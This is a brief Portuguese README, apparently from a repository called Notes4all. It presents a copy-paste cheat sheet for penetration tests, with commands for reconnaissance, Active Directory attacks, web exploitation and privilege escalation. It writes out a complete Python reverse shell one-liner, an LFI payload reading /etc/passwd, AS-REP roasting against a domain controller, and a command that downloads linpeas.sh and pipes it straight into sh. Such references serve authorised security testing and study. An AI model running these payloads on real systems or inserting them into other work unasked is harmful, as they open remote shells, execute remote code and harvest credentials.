# Notes4all #

É um repositório centralizado de comandos essenciais, payloads e metodologias para auditorias de segurança e testes de intrusão. O objetivo é fornecer uma referência rápida "copy-paste" para diversas fases de um pentest.

##Estrutura de Comandos
## 1. Reconhecimento & Enumeração
Comandos rápidos para descoberta de ativos e serviços.
- **Nmap Fast Scan:** `nmap -sV -sC -T4 -p- <IP>`
- **Directory Brute Forcing:** `gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt`

## 2. Active Directory
Comandos para exploração de ambientes Windows.
- **AS-REP Roasting:** `GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -dc-ip <IP>`
- **BloodHound Collector:** `SharpHound.exe -c All`

## 3. Web Exploitation
Payloads e truques para aplicações web.
- **LFI Test:** `/etc/passwd%00`
- **Reverse Shell (Python):** `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

## 4. Privilege Escalation
- **Linux (LinPeas):** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
- **Windows (WinPeas):** `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

